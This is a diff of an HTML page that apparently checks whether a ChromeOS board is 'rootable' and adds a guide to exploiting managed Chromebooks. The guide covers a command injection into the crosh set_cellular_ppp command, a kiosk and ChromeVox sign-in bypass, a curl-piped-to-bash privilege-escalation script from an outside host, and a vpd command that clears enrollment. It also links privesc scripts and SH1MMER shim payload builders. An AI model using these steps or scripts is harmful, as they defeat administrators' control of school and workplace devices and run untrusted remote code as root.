@@ -1,95 +1,184 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Root compatibility tool</title>
-    <script src="chrome100.json.js"></script>
-    <script>
-        const print = (text) => {
-            document.getElementById("all-logging").innerText += text + "\n";
-        }
-        let canRootBoard= (supplied_board) => {
-            document.getElementById("further-result").innerText = "";
-            let BOARD = chrome100.find(board => board.target == supplied_board);
-            let hasOldLegacyCrosh = document.getElementById("hasOldLegacyCrosh").checked,
-                hasLegacyCrosh = document.getElementById("hasLegacyCrosh").checked,
-                hasCrosh = document.getElementById("hasCrosh").checked,
-                hasTerminal = document.getElementById("hasTerminal").checked,
-                hasDriveFS = document.getElementById("hasDriveFS").checked,
-                hasARC = document.getElementById("hasARC").checked;
-            let downgradable = {
-                "v76": BOARD.images.find(image => image.params.chrome.split(".")[0] == "76") ? true : false,
-                "v80": BOARD.images.find(image => image.params.chrome.split(".")[0] == "80") ? true : false,
-                "v83": BOARD.images.find(image => image.params.chrome.split(".")[0] == "83") ? true : false,
-                "v87": BOARD.images.find(image => image.params.chrome.split(".")[0] == "87") ? true : false,
-                "v91": BOARD.images.find(image => (image.params.chrome.split(".")[0] == "91" && parseInt(image.params.platform.split(".")[1]) <= 64)) ? true : false,
-                "v101": BOARD.images.find(image => image.params.chrome.split(".")[0] == "101") ? true : false
-            }
-            print(JSON.stringify(downgradable));
-            let pwnable = downgradable;
-            if(!hasDriveFS) {
-                print("No drivefs. Disabling v101 and v91.");
-                pwnable["v91"] = false;
-                pwnable["v101"] = false;
-            }
-             if(!hasARC) {
-                print("WARNING: No ARC.");
-            //    pwnable["v76"] = false;
-            //    pwnable["v80"] = false;
-            //    pwnable["v83"] = false;
-            //    pwnable["v87"] = false;
-            }
-            if(!hasOldLegacyCrosh) {
-                print("No old-legacy crosh. Disabling v83.");
-            //    pwnable["v76"] = false;
-            //    pwnable["v80"] = false;
-                pwnable["v83"] = false;
-            }
-            if(!hasCrosh) {
-                print("No crosh. Disabling v87 and v91.");
-                pwnable["v87"] = false;
-                pwnable["v91"] = false;
-            }
-            if(!hasCrosh && !hasTerminal) {
-                print("No crosh and no terminal. Disabling v101.");
-                pwnable["v101"] = false;
-            }
-            print(JSON.stringify(pwnable));
-            let canRoot = false;
-            Object.keys(pwnable).forEach(ver => {
-                if(pwnable[ver]) {
-                    canRoot = true;
-                    document.getElementById("further-result").innerText += ver + "\n";
-                }
-            })
-            if(canRoot) document.getElementById("result").innerText = "Your device is rootable!";
-            else document.getElementById("result").innerText = "Your device is not rootable.";
-            return canRoot;
-        }
+	<meta charset="UTF-8">
+	<title>Root compatibility tool</title>
+	<style>
+		body {
+			line-height: 125%;
+		}
+		code {
+			white-space: pre;
+		}
+		code:not(.code-block) {
+			padding: 0.2em 0.4em;
+			border-radius: 6px;
+			background-color: rgba(175,184,193,0.2);
+			color: #24292f;
+		}
+		@media (prefers-color-scheme: dark) {
+			code:not(.code-block) {
+				background-color: rgba(110,118,129,0.4);
+				color: #c9d1d9;
+			}
+		}
+		#further-result {
+			white-space: pre-wrap;
+		}
+		input[type="checkbox"] {
+			vertical-align: top;
+		}
+		ol, ul {
+			margin: 5px 0px;
+		}
+		.indent {
+			padding-left: 40px;
+		}
+	</style>
+	<script src="chrome100.json.js"></script>
+	<script>
+		const otherArchBoards = ["asurada", "bob", "cherry", "daisy", "daisy-skate", "daisy-spring", "elm", "hana", "jacuzzi", "kevin", "kukui", "nyan-big", "nyan-blaze", "nyan-kitty", "peach-pi", "peach-pit", "scarlet", "strongbad", "trogdor", "veyron-fievel", "veyron-jaq", "veyron-jerry", "veyron-mickey", "veyron-mighty", "veyron-minnie", "veyron-speedy", "veyron-tiger", "x86-alex-he", "x86-mario", "x86-zgb-he"];
+		const shimBoards = ["brask", "brya", "clapper", "coral", "dedede", "enguarde", "glimmer", "grunt", "hana", "hatch", "jacuzzi", "kukui", "nami", "octopus", "orco", "pyro", "reks", "sentry", "stout", "strongbad", "tidus", "ultima", "volteer", "zork"];
+		const print = (text) => {
+			document.getElementById("all-logging").textContent += text + "\n";
+		}
+		const rangeComp = (a, b, c) => {
+			return b <= a && a <= c;
+		}
+		const prettyNames = {"80": "v80 (v75-83)"};
 
-    </script>
+		let canRootBoard = (supplied_board) => {
+			let BOARD = chrome100.find(board => board.target == supplied_board);
+			if (!BOARD) {
+				alert("invalid board");
+				return;
+			}
+			let hasLegacyCrosh = document.getElementById("hasLegacyCrosh").checked,
+				hasCrosh = document.getElementById("hasCrosh").checked,
+				hasCroshBlock99 = document.getElementById("hasCroshBlock99").checked,
+				hasDriveFS = document.getElementById("hasDriveFS").checked,
+				hasARC = document.getElementById("hasARC").checked,
+				hasKiosk = document.getElementById("hasKiosk").checked && BOARD.images.find(image => parseInt(image.params.chrome.split(".")[0]) <= 81);
+			let downgradable = {
+				"80": !!BOARD.images.find(image => rangeComp(parseInt(image.params.chrome.split(".")[0]), 75, 83)),
+				"87": !!BOARD.images.find(image => image.params.chrome.split(".")[0] == "87"),
+				"91": !!BOARD.images.find(image => (image.params.chrome.split(".")[0] == "91" && parseInt(image.params.platform.split(".")[1]) <= 64)),
+				"101": !!BOARD.images.find(image => image.params.chrome.split(".")[0] == "101")
+			}
+			print("Downgradable: " + JSON.stringify(downgradable));
+			let pwnable = Object.assign({"SH1MMER": shimBoards.includes(supplied_board)}, downgradable);
+
+			if (otherArchBoards.includes(supplied_board)) {
+				// maybe these will work in the future?
+				print("Non x86_64 board. Disabling v87, v91, v101");
+				pwnable["87"] = false;
+				pwnable["91"] = false;
+				pwnable["101"] = false;
+			}
+			if (!hasDriveFS) {
+				// same for these
+				print("No driveFS. Disabling v91, v101.");
+				pwnable["91"] = false;
+				pwnable["101"] = false;
+			}
+			if (!hasARC) {
+				print("No ARC. Disabling v87.");
+				pwnable["87"] = false;
+			}
+			if (!hasLegacyCrosh && !hasKiosk) {
+				print("No legacy crosh and no kiosk exploit. Disabling v80.");
+				pwnable["80"] = false;
+			}
+			if (!hasCrosh && !hasCroshBlock99) {
+				print("No crosh. Disabling v87, v91.");
+				pwnable["87"] = false;
+				pwnable["91"] = false;
+			}
+			if (!hasCrosh || hasCroshBlock99) {
+				print("No crosh (SFDL). Disabling v101.");
+				pwnable["101"] = false;
+			}
+			print("Result: " + JSON.stringify(pwnable) + "\n");
+			let canRoot = false;
+			document.getElementById("further-result").textContent = "";
+			Object.keys(pwnable).forEach(pwn => {
+				if (pwnable[pwn]) {
+					canRoot = true;
+					document.getElementById("further-result").textContent += (prettyNames[pwn] || (!isNaN(parseInt(pwn.charAt(0))) ? "v" + pwn : pwn)) + "\n";
+				}
+			})
+			document.getElementById("result").textContent = canRoot ? "Your device is rootable!" : "Your device is not rootable.";
+			return canRoot;
+		}
+	</script>
 </head>
 <body>
-    <h1>Root compatibility tool</h1>
-    <p>Use this tool to see if your device is rootable.</p>
-    <p><i>Devtip: You can also use this to quickly discover what boards cannot be rooted! <code>chrome100.forEach(board => {if(!canRootBoard(board.target)) console.log(board.target);})</code></i></p>
-    <div>
-        Board: <input id="board" type="text" placeholder="reks"/><br />
-        <i>These are additional settings and miscellaneous prerequisites for the root exploits. If you don't know, leave it checked.</i><br />
-        <!-- TODO: Accept policies.json file as input to automatically check these boxes. -->
-        <input type="checkbox" id="hasOldLegacyCrosh" checked> Can visit chrome-extension://pnhechapfaindjhompbnflcldabbghjo/html/crosh.html<br />
-        <input type="checkbox" id="hasLegacyCrosh" checked> Can visit chrome-extension://nkoccljplnhpfnfiajclkommnmllphnl/html/crosh.html<br />
-        <input type="checkbox" id="hasCrosh" checked> Can visit crosh (chrome-untrusted://crosh)<br />
-        <input type="checkbox" id="hasTerminal" checked> Can visit Terminal (chrome://terminal)<br />
-        <input type="checkbox" id="hasDriveFS" checked> Has Google Drive files in the file manager app<br />
-        <input type="checkbox" id="hasARC" checked> Has Google Play/Android/ARC enabled<br />
-        <button onclick="canRootBoard(document.getElementById('board').value)">go</button>
-    </div>
-    <div id="log">
-        <h2 id="result"></h2>
-        <h3 id="further-result"></h3>
-        <i>Notice: v91 is only exploitable on <b>platform version v13904.64.0</b> or lower. The tool filters out boards which do not include these platform versions, but some boards have multiple v91 builds.</i><br/>
-        <code id="all-logging"></code>
-    </div>
+	<h1>Root compatibility tool</h1>
+	<p>Use this tool to see if your device is rootable.</p>
+	<p><i>Devtip: You can also use this to quickly discover what boards cannot be rooted! <code>chrome100.forEach(board => {if(!canRootBoard(board.target)) console.log(board.target);})</code></i></p>
+	<div>
+		Board: <input id="board" type="text" placeholder="reks"/><br />
+		Go to <u>chrome://version</u> to find your board, or find your device model and locate it on <a target="_blank" href="https://chrome100.dev/">chrome100.dev</a>. (Use CTRL+F)<br /><br />
+		<i>These are additional settings and miscellaneous prerequisites for the root exploits. If you don't know, leave it alone.</i><br />
+		<!-- TODO: Accept policies.json file as input to automatically check these boxes. -->
+		<input type="checkbox" id="hasLegacyCrosh" checked> Can visit chrome-extension://nkoccljplnhpfnfiajclkommnmllphnl//html/crosh.html <i>(ignore extension blocks)</i><br />
+		<input type="checkbox" id="hasCrosh" checked> Can visit crosh (chrome-untrusted://crosh) <i>(ignore extension blocks)</i><br />
+		<input type="checkbox" id="hasCroshBlock99"> chrome-untrusted://crosh is blocked with "Application blocked by your administrator" (not "crosh is blocked")<br />
+		<input type="checkbox" id="hasDriveFS" checked> Has Google Drive files in the file manager app<br />
+		<input type="checkbox" id="hasARC" checked> Has Google Play/Android/ARC enabled<br />
+		<input type="checkbox" id="hasKiosk" checked> Has at least one kiosk app (Apps menu) on the sign-in screen<br /><br />
+		<button onclick="canRootBoard(document.getElementById('board').value)">Go</button>
+	</div>
+	<div>
+		<h2 id="result"></h2>
+		<h3 id="further-result"></h3>
+		<h2>Guide</h2>
+		<h3>Privilege Escalation</h3>
+		1. Go to <a target="_blank" href="https://chrome100.dev/">chrome100.dev</a> and download the desired version for your board.<br />
+		2. Flash the recovery image to a USB drive and recover your chromebook.<br />
+		&emsp;2a. If you don't have access to crosh, and you can downgrade to v81 or lower, skip to <a href="#kiosk">Kiosk Exploit</a>.<br />
+		3. Download the privilege escalation script for your version, and place it in your downloads directory.<br />
+		4. Open crosh, and run the command <code>set_cellular_ppp \';bash;exit;\'</code><br />
+		&emsp;note that on version 83 and below, the backslashes are not required.<br />
+		5. Run the command <code>bash &lt;(cat ~/Downloads/privesc.sh)</code><br />
+		&emsp;change the path to use the correct name of the file you downloaded.<br />
+		6. To unenroll, run the command <code>vpd -i RW_VPD -s check_enrollment=0</code> then powerwash your chromebook.
+		<h4 id="kiosk">Kiosk Exploit</h4>
+		<i>Only use these steps if you don't have access to crosh.</i><br /><br />
+		1. don't sign in after recovery<br />
+		2. turn wifi off<br />
+		3. open a kiosk app and wait for the error screen<br />
+		4. press ctrl+alt+z to enable chromevox<br />
+		5. start spamming search+o (you can hold search down but spam o)<br />
+		6. while spamming, press "diagnose", keep spamming until a browser window pops up (it may take up to 5 seconds)<br />
+		7. open a new tab, then press ctrl+alt+z to disable chromevox<br />
+		8. visit <u>chrome://os-settings</u> to turn wifi back on<br />
+		9. visit <u>chrome://extensions</u> and enable developer mode<br />
+		10. load an unpacked crosh extension from a USB drive (download at <a target="_blank" href="https://tinyurl.com/croshext">tinyurl.com/croshext</a>, you'll need to unzip it first)<br />
+		11. run the command <code>bash &lt;(curl https://hostz.glitch.me/80.sh)</code> (or another URL with a privesc script)<br />
+		12. resume on step 6
+		<h4>Downloads</h4>
+		<ul>
+			<li><a target="_blank" href="https://raw.githubusercontent.com/luphoria/chromeos-rootable/master/privesc/privesc-80-hyperskid-v3.sh">v80 privesc (works on v75 through v83)</a></li>
+			<li><a target="_blank" href="https://raw.githubusercontent.com/luphoria/chromeos-rootable/master/privesc/privesc-87.sh">v87 privesc</a></li>
+			<li><a target="_blank" href="https://raw.githubusercontent.com/luphoria/chromeos-rootable/master/privesc/privesc-91.sh">v91 privesc</a></li>
+			<li><a target="_blank" href="https://raw.githubusercontent.com/luphoria/chromeos-rootable/master/privesc/privesc-101.sh">v101 privesc</a></li>
+		</ul>
+		<br /><i>Notice: v91 is only exploitable on <b>platform version v13904.64.0</b> or lower. The tool filters out boards which do not include these platform versions, but some boards have multiple v91 builds.</i>
+		<h3>SH1MMER</h3>
+		1. Obtain a raw shim. You can download them at <a target="_blank" href="https://files.ultimatesrv.com/">files.ultimatesrv.com</a>.<br />
+		2. Inject the SH1MMER payload at <a target="_blank" href="https://build.ultimatesrv.com/">build.ultimatesrv.com</a> or <a target="_blank" href="https://sh1mmer.me/builder.html">sh1mmer.me</a>.<br />
+		3. Flash the SH1MMER image to a USB drive.<br />
+		4. Switch into developer mode (it doesn't matter if it's blocked), then insert the USB drive and press ESC+REFRESH+POWER.
+		<h2>Credits</h2>
+		luphoria - this page, crosh extension<br />
+		Rory McNamara - privescs<br />
+		OlyB - this page, v80 privesc<br />
+		Divide - chrome100, kiosk exploit<br />
+		B3AT - kiosk exploit<br />
+		Mercury Workshop - SH1MMER
+		<h2>Log</h2>
+		<code id="all-logging" class="code-block"></code>
+	</div>
 </body>
 </html>
